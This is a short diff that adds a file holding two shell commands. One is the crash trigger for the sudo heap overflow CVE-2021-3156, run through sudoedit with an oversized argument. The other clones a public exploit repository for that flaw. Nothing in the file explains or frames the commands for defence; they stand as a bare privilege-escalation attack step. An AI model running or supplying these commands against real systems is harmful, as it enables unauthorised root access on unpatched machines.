@@ -1,0 +1,4 @@
+
+sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+
+git clone https://github.com/blasty/CVE-2021-3156
